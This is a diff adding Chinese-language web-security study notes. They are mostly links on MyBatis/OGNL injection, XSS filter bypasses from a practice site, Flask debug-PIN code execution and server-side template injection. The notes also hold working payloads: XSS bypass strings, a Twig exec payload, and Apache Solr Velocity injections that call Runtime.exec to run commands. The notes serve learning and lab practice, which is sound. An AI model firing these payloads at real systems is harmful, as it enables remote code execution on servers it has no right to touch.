@@ -1,0 +1,341 @@
+参考：
+Mybatis入门教程：
+https://book.itxueyuan.com/GqXP/wpqEn
+
+SpringBoot集成Mybatis--写demo
+
+来自 <https://baijiahao.baidu.com/s?id=1715422022103662093&wfr=spider&for=pc> 
+
+聊聊mybatis-spring-boot-starter--架构图
+
+来自 <http://www.zyiz.net/tech/detail-139157.html> 
+来自 <http://www.zyiz.net/tech/detail-139157.html> 
+
+
+
+struts2漏洞_Struts2 S2061漏洞分析(CVE202017530)---黑名单与mybatis是一样的
+
+来自 <https://blog.csdn.net/weixin_39715513/article/details/111104662> 
+
+
+从一道CTF题浅谈MyBatis与Ognl的那些事
+
+来自 <https://forum.butian.net/share/1749> 
+
+
+//补充
+sqlSource主要是个接口，有四个实现类：
+	• StaticSqlSource静态SQL，DynamicSqlSource、RawSqlSource处理过后都会转成StaticSqlSource
+	• DynamicSqlSource处理包含${}、动态SQL节点的
+	• RawSqlSource处理不包含${}、动态SQL节点的
+	• ProviderSqlSource动态SQL，看名称应该是跟类似@SelectProvider注解有关
+
+
+
+Mybatis源码分析之（六）mybatis拦截器（Interceptor）的实现原理
+
+来自 <https://blog.csdn.net/niunai112/article/details/80484635> 
+
+
+
+
+==========其他==========
+mybatis-spring:
+http://mybatis.org/spring/zh/getting-started.html#
+什么是 MyBatis-Spring？
+MyBatis-Spring 会帮助你将 MyBatis 代码无缝地整合到 Spring 中。它将允许 MyBatis 参与到 Spring 的事务管理之中，创建映射器 mapper 和 SqlSession 并注入到 bean 中，以及将 Mybatis 的异常转换为 Spring 的 DataAccessException。 最终，可以做到应用代码不依赖于 MyBatis，Spring 或 MyBatis-Spring。
+
+
+
+MyBatis 配置介绍
+https://book.itxueyuan.com/GqXP/wpqEn
+
+MyBatis 的动态 SQL 广泛应用到了OGNL 表达式，OGNL 表达式可以灵活的组装 SQL 语句，从而完成更多的功能。
+
+来自 <https://book.itxueyuan.com/GqXP/lGjJb> 
+
+OGNL 全称 Object-Graph Navigation Language，是 Java 中的一个开源的表达式语言，用于访问对象数据。
+
+来自 <https://book.itxueyuan.com/GqXP/lGjJb> 
+
+
+Mybatis的OGNL表达式
+https://blog.csdn.net/panchang199266/article/details/80249452
+
+从sql注入到RCE （mybatis ognl注入）
+
+
+关闭严格模式？
+从mybatis从3.5.4开始，在org.apache.ibatis.ognl.OgnlRuntime#InvokeMethod方法中，有一个黑名单机制，当_useStricterInvocation属性为true时，黑名单中的类将不能被使用，例如执行命令要用到的Runtime和ProcessBuilder都在黑名单内：
+
+
+SpringBoot集成Mybatis--写demo
+
+
+来自 <https://baijiahao.baidu.com/s?id=1715422022103662093&wfr=spider&for=pc
+
+聊聊mybatis-spring-boot-starter
+来自 <http://www.zyiz.net/tech/detail-139157.html> 
+
+
+<script>alert(1)</script>
+
+绕过圆括号过滤
+https://xss.haozi.me/#/0x03
+
+<script>alert`1`</script>
+
+
+
+绕过圆括号、反引号过滤
+https://xss.haozi.me/#/0x04
+
+
+HTML编码：
+<img src=x onerror=alert&#40;1&#41;>
+
+绕过注释符过滤
+https://xss.haozi.me/#/0x05
+
+<!--XXXXX-->
+<!--XXXXX--!>
+
+--!><script>alert(1)</script>
+
+
+
+换行绕过onXXX校验
+https://xss.haozi.me/#/0x06
+type="image" src=1 onerror
+=alert(1)
+
+
+不闭合 >
+https://xss.haozi.me/#/0x07
+
+<img src=x onerror=alert(1)
+
+
+
+
+换行绕过
+https://xss.haozi.me/#/0x08
+</style
+>
+<script>alert(1)</script>
+
+
+
+
+
+https://xss.haozi.me/#/0x09
+https://www.segmentfault.com/"></script><img src=x onerror=alert(1)>
+
+绕过域名：
+htts://www.segmentfault.com@xss.haozi.me/j.js
+
+
+大小写绕过
+<ScriPt>alert(1)</ScriPt>
+
+利用不常见的标签
+<svg
+<onxxx
+
+
+
+更多xss payload参考：
+https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
+
+
+DVWA-XSS学习笔记
+将cookie发到自己的服务器
+https://www.cnblogs.com/yuzly/p/10692449.html
+
+
+
+Escalating XSS in PhantomJS Image Rendering to SSRF/Local-File Read
+https://buer.haus/2017/06/29/escalating-xss-in-phantomjs-image-rendering-to-ssrflocal-file-read/
+web后端用了webkit开发，存在类似WebView读取本地文件的利用方式
+
+pdf xss？
+
+
+案例：富文本存储型XSS（ZZCMS v8.2）
+ZZCMS v8.2 代码审计
+https://www.freebuf.com/vuls/215484.html
+后台信息页面信息发布存在存储型XSS漏洞
+
+
+案例：UEditor编辑器存储型XSS
+挖洞经验｜UEditor编辑器存储型XSS漏洞
+https://www.freebuf.com/vuls/269956.html
+UEditor存在一个XSS漏洞，编辑器在定义过滤规则的时候不严和读取内容的时候的绕过导致了该漏洞
+
+
+
+利用文件上传功能深入利用xss漏洞
+
+
+jinjia2 模板注入
+https://jinja.palletsprojects.com/en/2.11.x/templates/
+
+Mako简介
+Mako是一个基于python的模板引擎。模板还可以包含Mako指令，用来表示变量和表达式替换、控制结构、服务器端注释、整块Python代码，还有用来提供额外功能的各种标签。所有这些结构都被编译为实际的Python代码
+Mako官网: https://www.makotemplates.org/
+
+Tornado简介
+Tornado是一种 Web 服务器软件的开源版本。Tornado 和主流Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。得利于其非阻塞的方式和对epoll的运用，Tornado 每秒可以处理数以千计的连接，因此 Tornado 是实时 Web 服务的一个 理想框架
+Tornado官网中文: https://tornado-zh-cn.readthedocs.io/zh_CN/latest/
+
+
+Django下，如果装了对应的插件，应该也能利用pin来执行代码吧。 
+https://django-extensions.readthedocs.io/en/latest/runserver_plus.html
+https://spapas.github.io/2016/06/07/django-werkzeug-debugger/
+
+来自 <https://xz.aliyun.com/t/2553#toc-2> 
+
+flask之ssti模版注入从零到入门
+小猪佩琪 / 2018-12-23 09:13:00 / 浏览数 31800 社区板块 WEB安全顶(7) 踩(0)
+ https://xz.aliyun.com/t/3679
+
+
+过滤引号、中括号等特殊字符参考这篇文章
+https://xz.aliyun.com/t/6885
+
+后面还有过滤request、过滤数字的，参考
+https://blog.csdn.net/weixin_45696568/article/details/113625650
+
+
+绕过黑名单
+[GYCTF2020]FlaskApp
+https://www.cnblogs.com/SONGYUELV/p/15145684.html
+
+
+pin码绕过黑名单
+
+还可以通过计算pin码远程执行绕过代码的黑名单校验
+
+pin码执行命令
+使用条件，server开启了debug模式，存在任意文件读取漏洞。
+开启了debug的flask项目在启动时会生成一个debug用的pin码，可以执行python指令。
+image.png
+而这个pin码在知晓一些条件后，是可以计算出来的。
+
+Flask debug pin安全问题
+
+来自 <https://xz.aliyun.com/t/2553#toc-2> 
+
+
+flask框架下的ssti+pin码执行命令
+来自 <https://www.jianshu.com/p/cbca419ba075> 
+
+
+Python模板注入(SSTI)深入学习
+来自 <https://xz.aliyun.com/t/6885> 
+https://xz.aliyun.com/t/6885
+
+
+SSTI模板注入绕过（进阶篇）
+https://blog.csdn.net/miuzzx/article/details/110220425
+
+从零学习flask模板注入
+来自 <https://www.freebuf.com/column/187845.html> 
+
+模板注入比较全的一个博客
+https://www.cnblogs.com/bmjoker/p/13508538.html
+在这里提供一个针对twig的攻击载荷：
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+
+
+SHTML模板注入
+https://www.cnblogs.com/yuzly/p/11226439.html
+
+
+利用内置api进行RCE
+In-depth Freemarker Template Injection
+来自 <https://ackcent.com/in-depth-freemarker-template-injection/> 
+
+
+Apache Solr Velocity 模板注入
+Payload：
+• q=1&&wt=velocity&v.template=custom&v.template.custom=#set($x='') #set($rt=$x.class.forName('java.lang.Runtime')) #set($chr=$x.class.forName('java.lang.Character')) #set($str=$x.class.forName('java.lang.String')) #set($ex=$rt.getRuntime().exec('whoami')) $ex.waitFor() #set($out=$ex.getInputStream()) #foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+Apache Solr 源码地址：http://archive.apache.org/dist/lucene/solr/8.2.0/
+
+Velocity 模板注入源码分析
+
+Payload：
+• http://127.0.0.1:8080/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(%22java.lang.Runtime%22).type.getRuntime().exec(%22sleep%205%22).waitFor()
+• 127.0.0.1:8080/velocity?template=#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()
+
+
+springboot-thymeleaf动态模板生成
+来自 <http://t.zoukankan.com/tiramisuyj-p-9521152.html> 
+
+Thymeleaf 模板注入命令执行
+https://zhuanlan.zhihu.com/p/248416919
+
+
+记一次实战之若依SSTI注入绕过玄某盾
+来自 <https://xz.aliyun.com/t/11509> 
+
+
+
+
+Spring View Manipulation Vulnerability
+https://www.veracode.com/blog/secure-development/spring-view-manipulation-vulnerability
+github：
+https://github.com/veracode-research/spring-view-manipulation
+Thymeleaf Fragment 注入漏洞复现及新姿势扩展
+https://xz.aliyun.com/t/9826#toc-4
+Thymeleaf模板注入导致命令执行漏洞分析
+https://www.freebuf.com/articles/network/250026.html
+Java安全之Thymeleaf SSTI分析
+https://www.cnblogs.com/CoLo/p/15507738.html
+英文版：Thymeleaf SSTI analysis of Java Security
+https://copyfuture.com/blogs-details/20211121071046977B
+spring boot的Thymeleaf模板注入
+https://blog.csdn.net/caiqiiqi/article/details/108446723
+java安全开发之spring boot Thymeleaf模板注入
+https://mp.weixin.qq.com/s/-KJijVbZGo6W7gLcve9IkQ
+java 安全开发之 spring boot Thymeleaf 模板注入
+https://paper.seebug.org/1332/
+Thymeleaf模板漏洞分析
+http://x2y.pw/2020/11/15/Thymeleaf-模板漏洞分析/
+javaweb-Thymeleaf-ssti
+https://www.cnblogs.com/-zhong/p/15594552.html
+Thymeleaf SSTI 分析以及最新版修复的 Bypass
+https://www.cnpanda.net/sec/1063.html
+Exploiting SSTI in Thymeleaf 
+https://www.acunetix.com/blog/web-security-zone/exploiting-ssti-in-thymeleaf/
+在Thymeleaf中利用SSTI
+https://my.oschina.net/u/4587690/blog/4662837
+spring-boot-thymeleaf-ssti
+https://turn1tup.github.io/2021/08/10/spring-boot-thymeleaf-ssti/
+
+
+
+java 安全开发之 spring boot Thymeleaf 模板注入
+https://paper.seebug.org/1332/
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
